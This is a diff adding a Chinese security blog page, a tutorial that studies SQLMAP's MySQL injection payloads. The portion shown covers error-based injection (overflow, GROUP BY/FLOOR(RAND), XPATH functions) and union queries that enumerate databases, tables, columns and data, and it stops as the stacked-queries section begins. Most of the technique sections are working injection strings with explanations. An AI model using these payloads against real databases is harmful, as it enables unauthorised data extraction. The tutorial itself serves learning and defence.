@@ -1,0 +1,336 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><title>SQL注入方法和绕过技巧 | BingSlient's Blog</title><meta name="description" content="SQL注入方法和绕过技巧"><meta name="keywords" content="MySQL,SQL注入,SQLMAP"><meta name="author" content="BingSlient"><meta name="copyright" content="BingSlient"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="canonical" href="https://bingslient.github.io/2019/10/31/SQLMAP数据库注入方法和绕过技巧/"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="SQL注入方法和绕过技巧"><meta name="twitter:description" content="SQL注入方法和绕过技巧"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/BingSlient/cdn/photo/avatar.jpg"><meta property="og:type" content="article"><meta property="og:title" content="SQL注入方法和绕过技巧"><meta property="og:url" content="https://bingslient.github.io/2019/10/31/SQLMAP数据库注入方法和绕过技巧/"><meta property="og:site_name" content="BingSlient's Blog"><meta property="og:description" content="SQL注入方法和绕过技巧"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/BingSlient/cdn/photo/avatar.jpg"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="prev" title="在 Ubuntu18.04 安装 LEMP，构建本地网站" href="https://bingslient.github.io/2019/10/31/本地 web 服务器搭建之LEMP/"><link rel="next" title="关系数据库管理基础" href="https://bingslient.github.io/2019/10/31/关系数据库管理基础/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xxx/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
+  highlight_copy: 'true',
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  bookmark: {
+    title: '添加书签',
+    message_prev: '按',
+    message_next: '键将本页加入书签'
+  },
+  runtime_unit: '天'
+
+  
+}</script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div class="auto_open" id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#背景"><span class="toc-number">1.</span> <span class="toc-text">背景</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL注入的方法"><span class="toc-number">2.</span> <span class="toc-text">SQL注入的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#报错注入"><span class="toc-number">2.1.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#概念"><span class="toc-number">2.1.1.</span> <span class="toc-text">概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payloads"><span class="toc-number">2.1.2.</span> <span class="toc-text">Payloads</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#数溢出报错"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">数溢出报错</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GROUP-BY-报错"><span class="toc-number">2.1.2.2.</span> <span class="toc-text">GROUP BY 报错</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XPATH-报错"><span class="toc-number">2.1.2.3.</span> <span class="toc-text">XPATH 报错</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#联合查询"><span class="toc-number">2.2.</span> <span class="toc-text">联合查询</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#概念-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payloads-1"><span class="toc-number">2.2.2.</span> <span class="toc-text">Payloads</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Mysql-gt-5-0"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">Mysql &gt;= 5.0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MySQL-gt-4-1"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">MySQL &gt;= 4.1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#未知列名的情况"><span class="toc-number">2.2.2.3.</span> <span class="toc-text">未知列名的情况</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#堆叠查询"><span class="toc-number">2.3.</span> <span class="toc-text">堆叠查询</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#概念-2"><span class="toc-number">2.3.1.</span> <span class="toc-text">概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payloads-2"><span class="toc-number">2.3.2.</span> <span class="toc-text">Payloads</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#判断注入点"><span class="toc-number">2.3.2.1.</span> <span class="toc-text">判断注入点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#推断数据库信息"><span class="toc-number">2.3.2.2.</span> <span class="toc-text">推断数据库信息</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#布尔盲注"><span class="toc-number">2.4.</span> <span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#概念-3"><span class="toc-number">2.4.1.</span> <span class="toc-text">概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payloads-3"><span class="toc-number">2.4.2.</span> <span class="toc-text">Payloads</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#判断注入点-1"><span class="toc-number">2.4.2.1.</span> <span class="toc-text">判断注入点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#推断数据库信息-1"><span class="toc-number">2.4.2.2.</span> <span class="toc-text">推断数据库信息</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#延时盲注"><span class="toc-number">2.5.</span> <span class="toc-text">延时盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#概念-4"><span class="toc-number">2.5.1.</span> <span class="toc-text">概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payloads-4"><span class="toc-number">2.5.2.</span> <span class="toc-text">Payloads</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#延时的方法"><span class="toc-number">2.5.2.1.</span> <span class="toc-text">延时的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SLEEP"><span class="toc-number">2.5.2.1.1.</span> <span class="toc-text">SLEEP</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#BENCHMARK"><span class="toc-number">2.5.2.1.2.</span> <span class="toc-text">BENCHMARK</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#GET-LOCK"><span class="toc-number">2.5.2.1.3.</span> <span class="toc-text">GET_LOCK</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#笛卡尔积-查询"><span class="toc-number">2.5.2.1.4.</span> <span class="toc-text">笛卡尔积 查询</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RLIKE-正则匹配"><span class="toc-number">2.5.2.1.5.</span> <span class="toc-text">RLIKE 正则匹配</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#判断注入点-2"><span class="toc-number">2.5.2.2.</span> <span class="toc-text">判断注入点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#推断数据库信息-2"><span class="toc-number">2.5.2.3.</span> <span class="toc-text">推断数据库信息</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内联查询"><span class="toc-number">2.6.</span> <span class="toc-text">内联查询</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#概念-5"><span class="toc-number">2.6.1.</span> <span class="toc-text">概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload"><span class="toc-number">2.6.2.</span> <span class="toc-text">Payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#绕过技巧"><span class="toc-number">3.</span> <span class="toc-text">绕过技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMAP-中的绕过技巧"><span class="toc-number">3.1.</span> <span class="toc-text">SQLMAP 中的绕过技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#字符编码转换"><span class="toc-number">3.1.1.</span> <span class="toc-text">字符编码转换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#同等功能转换"><span class="toc-number">3.1.2.</span> <span class="toc-text">同等功能转换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用注释符"><span class="toc-number">3.1.3.</span> <span class="toc-text">使用注释符</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#自定义-Tamper-脚本"><span class="toc-number">3.2.</span> <span class="toc-text">自定义 Tamper 脚本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://cdn.jsdelivr.net/gh/BingSlient/cdn/photo/post.jpg)"><div id="page-header"><span class="pull-left"> <a class="blog_title" id="site-name" href="/">BingSlient's Blog</a></span><div class="open toggle-menu pull-right"><div class="menu-icon-first"></div><div class="menu-icon-second"></div><div class="menu-icon-third"></div></div><span class="pull-right menus"><div class="mobile_author_icon"><img class="lozad" data-src="https://cdn.jsdelivr.net/gh/BingSlient/cdn/photo/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'"><div class="mobile_author-info__description"></div></div><hr><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a><script>document.body.addEventListener('touchstart', function(){ });</script></div></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title"><div class="posttitle">SQL注入方法和绕过技巧</div></div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 发表于 2019-10-31<span class="post-meta__separator">|</span><i class="fa fa-history" aria-hidden="true"></i> 更新于 2019-10-02</time><span class="post-meta__separator mobile_hidden">|</span><span class="mobile_hidden"><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/web-安全基础/">web 安全基础</a></span><div class="post-meta-wordcount"><span>字数总计: </span><span class="word-count">5.1k</span><span class="post-meta__separator">|</span><span>阅读时长: 21 分钟</span><span class="post-meta__separator">|</span><span>阅读量: </span><span id="busuanzi_value_page_pv"></span></div></div></div></div><div class="layout layout_post" id="content-inner">   <article id="post"><div class="article-container" id="post-content"><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>说到SQL注入那就不得不提这个领域自动化操作的佼佼者——SQLMAP，因此学习SQL注入很好的一个方法就是，分析SQLMAP的注入流程。<br>下面通过学习 SQLMAP 中的注入方法和其相应的 Payload，以及 SQLMAP 中的 Tamper 脚本源码，了解 SQL注入的常见方法和绕过技巧。</p>
+<h1 id="SQL注入的方法"><a href="#SQL注入的方法" class="headerlink" title="SQL注入的方法"></a>SQL注入的方法</h1><p>依据注入过程获取信息的主要技巧不同，SQLMAP 中把注入技术分为以下 6 种，分别为 报错注入（<strong>E</strong>rror-based）、联合查询（<strong>U</strong>nion queries）、堆叠查询（<strong>S</strong>tack queries）、布尔盲注（<strong>B</strong>oolean-based blind）、延时盲注（<strong>T</strong>ime-based blind）、内联查询（inline queries）。SQLMAP 中使用 <code>--technique</code> 的选项选择使用不同的注入技术，默认为 <code>”EUSBTQ“</code> ，每个字母分别对应上述 6 种技术的一种。</p>
+<p>接着我会按 SQLMAP 中每一类技术中的 Payload 和通用 注入向量（模板）进行分析，SQLMAP 的 Payload 可在其<a href="https://github.com/sqlmapproject/sqlmap/tree/master/data/xml/payloads" target="_blank" rel="noopener">源码中查看</a>，Payload 均以 XML 文件格式存储，对于其中 Payload 较少的，在另外从<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md" target="_blank" rel="noopener">PayloadsAllTheThings-MySQLInjection</a> 学习。<strong>所有的 Payload 均为 Mysql 环境下的。</strong></p>
+<blockquote>
+<p>Q：表示使用内联查询（inline queries）进行注入，为什么不用 <code>I</code>？个人认为可能是 <code>I</code> 显示有点像 <code>1</code>，不易读。</p>
+</blockquote>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>报错注入（Error-based）的利用条件是：</p>
+<ol>
+<li>SQL 操作/函数 报错</li>
+<li>构造会出现执行错误的 SQL 查询语句，将需要获取的信息（如版本、数据库名）放到会在错误信息输出的位置</li>
+<li>网站回显数据库执行的报错信息，得到数据库信息</li>
+</ol>
+<p>报错注入常使用的操作/函数：</p>
+<ul>
+<li><code>FLOOR(RAND(0)*2)</code> + <code>GROUP BY</code>，报错信息 <code>Duplicated entry</code></li>
+<li><code>ExtractValue(1, ”构造信息“)</code>，报错信息 <code>XPATH syntax error: 信息</code></li>
+<li><code>UpdateXML(1, “构造信息”, 1)</code>，报错信息<code>XPATH syntax error: 信息</code></li>
+</ul>
+<h3 id="Payloads"><a href="#Payloads" class="headerlink" title="Payloads"></a>Payloads</h3><p>Payload 文件：error_based.xml，主要分析以下几个注入 Payload：</p>
+<h4 id="数溢出报错"><a href="#数溢出报错" class="headerlink" title="数溢出报错"></a>数溢出报错</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 攻击向量</span><br><span class="line">AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(&apos;[DELIMITER_START]&apos;,([QUERY]),&apos;[DELIMITER_STOP]&apos;,&apos;x&apos;))s), 8446744073709551610, 8446744073709551610)))</span><br><span class="line"># 攻击 Payload</span><br><span class="line">AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(&apos;[DELIMITER_START]&apos;,(SELECT (ELT([RANDNUM]=[RANDNUM],1))),&apos;[DELIMITER_STOP]&apos;,&apos;x&apos;))s), 8446744073709551610, 8446744073709551610)))</span><br><span class="line">########## 分析 ##########</span><br><span class="line"># 想要获取的内容在攻击向量的 [QUERY] 部分，IF 条件是否成立，</span><br><span class="line"># 都会选择一个大整数 8446744073709551610*2，就会导致整数溢出</span><br><span class="line"># 攻击条件: Mysql &gt;= 5.5</span><br><span class="line"></span><br><span class="line"># 攻击向量</span><br><span class="line">AND EXP(~(SELECT * FROM (SELECT CONCAT(&apos;[DELIMITER_START]&apos;,([QUERY]),&apos;[DELIMITER_STOP]&apos;,&apos;x&apos;))x))</span><br><span class="line"># 攻击 Payload</span><br><span class="line">AND EXP(~(SELECT * FROM (SELECT CONCAT(&apos;[DELIMITER_START]&apos;,version(),&apos;[DELIMITER_STOP]&apos;,&apos;x&apos;))x))</span><br><span class="line">########## 分析 ##########</span><br><span class="line"># 想要获取的内容在攻击向量的 [QUERY] 部分， ~ 符号取反，</span><br><span class="line"># 导致数值很大的数，进行 exp() 操作导致最终的结果溢出</span><br><span class="line"># 攻击条件：Mysql &gt;= 5.5</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>上面两个攻击方法在我自己使用过程中，得不到相应的信息，错误信息展开 [QUERY] 中的内容，如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; mysql&gt; select id from comments where id=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(char(126),(select elt(335=335,1)),char(126)))s), 8446744073709551610, 8446744073709551610)));</span><br><span class="line">&gt; ERROR 1690 (22003): BIGINT value is out of range in &apos;(2 * if((select `s`.`CONCAT(char(126),(select elt(335=335,1)),char(126))` from (select concat(char(126),elt((335 = 335),1),char(126)) AS `CONCAT(char(126),(select elt(335=335,1)),char(126))`) `s`),8446744073709551610,8446744073709551610))&apos;</span><br><span class="line">&gt; </span><br><span class="line">&gt; mysql&gt; select exp(~(select * from (select CONCAT(&apos;[DELIMITER_START]&apos;,version(),&apos;[DELIMITER_STOP]&apos;,&apos;x&apos;))s));</span><br><span class="line">&gt; ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(~((select `s`.`CONCAT(&apos;[DELIMITER_START]&apos;,version(),&apos;[DELIMITER_STOP]&apos;,&apos;x&apos;)` from (select concat(&apos;[DELIMITER_START]&apos;,version(),&apos;[DELIMITER_STOP]&apos;,&apos;x&apos;) AS `CONCAT(&apos;[DELIMITER_START]&apos;,version(),&apos;[DELIMITER_STOP]&apos;,&apos;x&apos;)`) `s`)))&apos;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4 id="GROUP-BY-报错"><a href="#GROUP-BY-报错" class="headerlink" title="GROUP BY 报错"></a>GROUP BY 报错</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 攻击向量</span><br><span class="line">OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT(&apos;[DELIMITER_START]&apos;,([QUERY]),&apos;[DELIMITER_STOP]&apos;,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br><span class="line"># 攻击 Payload</span><br><span class="line">OR (SELECT NULL FROM(SELECT COUNT(*),CONCAT(&apos;~&apos;,database(),&apos;~&apos;,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br><span class="line"></span><br><span class="line">########## 分析 ##########</span><br><span class="line"># 想要获取的内容在攻击向量的 [QUERY] 部分进行构造，</span><br><span class="line"># 报错原因在于，使用 GROUP BY 语句以 x 列进行分组，组内使用 COUNT 统计，x 列的值由</span><br><span class="line"># CONCAT(&apos;~&apos;,database(),&apos;~&apos;,FLOOR(RAND(0)*2)) 产生，而 FLOOR(RAND(0)*2)) 的值为 1 或 0，</span><br><span class="line"># GROUP BY 进行分组时，会建立一个虚拟表，虚拟表有两个列，分别为 x 和 count(*)，然后查询数据时，</span><br><span class="line"># 首先检查分组 x的值 是否存在，如果不存在，则插入虚拟表，存在 count(*)+1，但是查询分组的值是否存在</span><br><span class="line"># 以及插入分组值时都会重新计算 RAND(0)*2)，而 FLOOR(RAND(0)*2)) 产生的序列为 01101...,</span><br><span class="line"># 第一次插入时检查为0，插入为1，第二次检查为1，count(*)+1，第三次检查为0，虚拟表不存在，但实际</span><br><span class="line"># 插入的值为 1，导致 group_key 重复。</span><br><span class="line"># 利用条件：Mysql &gt;= 5.0，使用 count() + floor(rand(0)*2) + group by</span><br><span class="line"></span><br><span class="line"># 低版本 Mysq &gt;= 4.1, 不存在 information_schema，自行构造数据</span><br><span class="line"># 攻击向量</span><br><span class="line">OR ROW([RANDNUM],[RANDNUM1])&gt;(SELECT COUNT(*),CONCAT(&apos;[DELIMITER_START]&apos;,([QUERY]),&apos;[DELIMITER_STOP]&apos;,FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)</span><br><span class="line"># 攻击 Payload</span><br><span class="line">OR ROW(1,2)&gt;(SELECT COUNT(*),CONCAT(&apos;~&apos;,database(),&apos;~&apos;,FLOOR(RAND(0)*2))x FROM (SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6)a GROUP BY x)</span><br></pre></td></tr></table></figure>
+
+<h4 id="XPATH-报错"><a href="#XPATH-报错" class="headerlink" title="XPATH 报错"></a>XPATH 报错</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 攻击向量</span><br><span class="line">AND EXTRACTVALUE([RANDNUM],CONCAT(1,&apos;[DELIMITER_START]&apos;,([QUERY]),&apos;[DELIMITER_STOP]&apos;))</span><br><span class="line"># 攻击 Payload</span><br><span class="line">AND EXTRACTVALUE(1,CONCAT(&apos;~&apos;,database(),&apos;~&apos;))</span><br><span class="line">########## 分析 ###########</span><br><span class="line"># ExtractValue(xml_frag, xpath_expr)，第一个参数时 XML 文档字符串，第二个参数时 XPATH 路径，</span><br><span class="line"># 当 XPATH 路径错误是，就会报错，错误信息即为： CONCAT(&apos;~&apos;,database(),&apos;~&apos;) 执行后的结果</span><br><span class="line"></span><br><span class="line"># 攻击向量</span><br><span class="line">AND UPDATEXML([RANDNUM],CONCAT(&apos;.&apos;,&apos;[DELIMITER_START]&apos;,([QUERY]),&apos;[DELIMITER_STOP]&apos;),[RANDNUM1])</span><br><span class="line"># 攻击 Payload</span><br><span class="line">AND UPDATEXML(1,CONCAT(&apos;.&apos;,&apos;~&apos;,version(),&apos;~&apos;),2)</span><br><span class="line">########## 分析 ###########</span><br><span class="line"># UpdateXML(xml_target, xpath_expr, new_xml)，第二个参数为 XPATH，</span><br><span class="line"># 当 XPATH 路径错误是，就会报错，错误信息即为： CONCAT(&apos;.&apos;,&apos;~&apos;,version(),&apos;~&apos;) 执行后的结果                         </span><br><span class="line"># 利用条件：Mysql &gt;= 5.1</span><br></pre></td></tr></table></figure>
+
+<h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><p>联合查询（Union Queries）使用 <code>UNION SELECT</code>语句联合两个查询列数相同的 <code>SELECT</code>语句，</p>
+<p>联合查询的利用条件是：</p>
+<ol>
+<li>可以使用 <code>UNION SELECT</code> 语句</li>
+<li><code>UNION SELECT</code> 语句查询的结果能看到</li>
+</ol>
+<h3 id="Payloads-1"><a href="#Payloads-1" class="headerlink" title="Payloads"></a>Payloads</h3><p>通常先使用 <code>ORDER BY</code> 语句查出显示的列数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ORDER BY 1 #</span><br><span class="line">ORDER BY 2 #</span><br><span class="line">...</span><br><span class="line">ORDER BY N # </span><br><span class="line"># 当没有显示，或者网页报错时，说明前一个数即为列数</span><br></pre></td></tr></table></figure>
+
+<p>SQLMAP中给出的通用攻击向量如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT 1,2,3,.. [SQL_COMMENT]</span><br></pre></td></tr></table></figure>
+
+<h4 id="Mysql-gt-5-0"><a href="#Mysql-gt-5-0" class="headerlink" title="Mysql &gt;= 5.0"></a><strong>Mysql &gt;= 5.0</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 查数据库名字</span><br><span class="line">UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata</span><br><span class="line"># 查表名</span><br><span class="line">UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...</span><br><span class="line"># 查列名</span><br><span class="line">UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...</span><br><span class="line"># 查数据</span><br><span class="line">UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...</span><br></pre></td></tr></table></figure>
+
+<p>不使用 <code>information_schema</code>获取列名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 使用 JOIN 操作依次报错查询列名</span><br><span class="line">-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b)a</span><br><span class="line"># ERROR 1060 - Duplicate column name &apos;id&apos;</span><br><span class="line"></span><br><span class="line">-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a</span><br><span class="line"># ERROR 1060 - Duplicate column name &apos;name&apos;</span><br><span class="line"></span><br><span class="line">-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<h4 id="MySQL-gt-4-1"><a href="#MySQL-gt-4-1" class="headerlink" title="MySQL &gt;= 4.1"></a>MySQL &gt;= 4.1</h4><p>低版本的 Mysql 没有 <code>information_schema</code>，通常只能暴力破解表名，之后可以按如下方式获取列名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 查列数，假定表有 4 列</span><br><span class="line">select 1 and(SELECT * from table_name)=(1)</span><br><span class="line"># 报错： Operand should contain 4 column(s)，获取列数 4</span><br><span class="line"></span><br><span class="line"># 接着获取列名</span><br><span class="line">select 1 and (1,2,3,4) = (SELECT * from table_name UNION SELECT 1,2,3,4 LIMIT 1)</span><br><span class="line"># 报错：column &apos;id&apos; cannot be null</span><br></pre></td></tr></table></figure>
+
+<h4 id="未知列名的情况"><a href="#未知列名的情况" class="headerlink" title="未知列名的情况"></a>未知列名的情况</h4><p>在未知列名的情况，也能获取数据，技巧就是使用列名的别称。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 获取表 users 的 4 列内容</span><br><span class="line">select `4` from (select 1,2,3,4,5,6 union select * from users)x; </span><br><span class="line"># 直接使用字符</span><br><span class="line">select concat(a,&apos;~&apos;,b) from (select &apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;,&apos;e&apos;,&apos;f&apos; union select * from users)x;</span><br><span class="line"># 别名</span><br><span class="line">select concat(a,&apos;~&apos;,b) from (select 1,2 as &apos;a&apos;,3,4,5 as &apos;b&apos;,6 union select * from users)x;</span><br></pre></td></tr></table></figure>
+
+<h2 id="堆叠查询"><a href="#堆叠查询" class="headerlink" title="堆叠查询"></a>堆叠查询</h2><h3 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h3><p>堆叠查询（Stack Queries）可以依次执行多个 SQL 查询语句，类似 Linux 依次执行多个命令 <code>cd ..; ls</code>。不同的数据库和API 对堆叠查询的支持不一样，如MySQL 、MSSQL、PostgreSQL 本身是支持堆叠查询的，使用 <code>;</code> 将多个语句分开，但是可能数据库的API 接口不支持，如 PHP的数据库查询接口就有可能不支持。堆叠查询和联合查询的区别在于：堆叠查询可以执行任何 SQL 语句（只要能成功执行，如<code>DELECT</code>、<code>INSERT</code>等操作），联合查询仅支持 <code>SELECT</code>语句，同时两个查询语句的列数要一致。</p>
+<p>堆叠查询的利用条件：</p>
